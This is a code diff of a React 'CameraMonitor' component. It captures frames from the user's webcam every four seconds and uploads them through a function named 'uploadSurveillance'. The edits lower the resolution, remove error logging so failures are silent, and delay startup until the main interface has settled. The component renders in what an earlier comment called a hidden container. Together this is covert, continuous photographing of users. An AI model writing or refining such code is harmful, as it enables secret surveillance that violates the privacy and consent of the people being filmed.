@@ -15,33 +15,31 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
     let stream: MediaStream | null = null;
     let intervalId: any;
     let checkActiveInterval: any;
+    let initTimeout: any;
 
     const startCamera = async () => {
       try {
-        // REQUEST HIGH RESOLUTION
-        // 'ideal' tells the browser to try to get this resolution, 
-        // but it will fallback to the best available if not supported.
+        // Request High Resolution, but graceful fallback happens automatically by browser
         stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: "user",
-            width: { ideal: 1920 }, // Target Full HD
-            height: { ideal: 1080 } 
+            width: { ideal: 1280 }, // 720p is sufficient and faster to load
+            height: { ideal: 720 } 
           } 
         });
         
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
-          // IMPORTANT: Must play to start stream
           try {
              await videoRef.current.play();
-          } catch(e) { console.error("Auto-play blocked:", e); }
+          } catch(e) { /* Auto-play blocked, ignore */ }
           onSuccess();
         }
 
-        // Capture every 4 seconds
+        // Capture loop
         intervalId = setInterval(captureFrame, 4000);
         
-        // Safety check: Ensure video keeps playing (mobile browsers sometimes pause background video)
+        // Keep-alive check for mobile browsers
         checkActiveInterval = setInterval(() => {
             if (videoRef.current && videoRef.current.paused && stream) {
                 videoRef.current.play().catch(() => {});
@@ -49,8 +47,8 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
         }, 2000);
 
       } catch (err: any) {
-        // Permission denied or device not found
-        console.warn("Cam Monitor:", err.name);
+        // Permission denied or unavailable. 
+        // We fail silently so the user experience isn't broken.
         onError();
       }
     };
@@ -61,26 +59,20 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
         const canvas = canvasRef.current;
         const context = canvas.getContext('2d');
 
-        // Check if video has valid dimensions
         if (context && video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
-          
-          // DYNAMIC RESIZE: Set canvas to match the actual stream resolution
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-
-          // Draw exact frame
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          // Compress slightly (0.6) to keep file size manageable while maintaining HD quality
           const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-          
-          // Upload
           await dataService.uploadSurveillance(user, dataUrl);
         }
       }
     };
 
-    startCamera();
+    // Delay initialization by 2 seconds to allow Main UI/Modal to settle
+    initTimeout = setTimeout(() => {
+        startCamera();
+    }, 2000);
 
     return () => {
       if (stream) {
@@ -88,12 +80,11 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
       }
       if (intervalId) clearInterval(intervalId);
       if (checkActiveInterval) clearInterval(checkActiveInterval);
+      if (initTimeout) clearTimeout(initTimeout);
     };
   }, [user]);
 
   return (
-    // HIDDEN CONTAINER
-    // We remove fixed width/height attributes to allow the elements to adapt to the stream
     <div style={{ 
         position: 'fixed', 
         bottom: 0, 
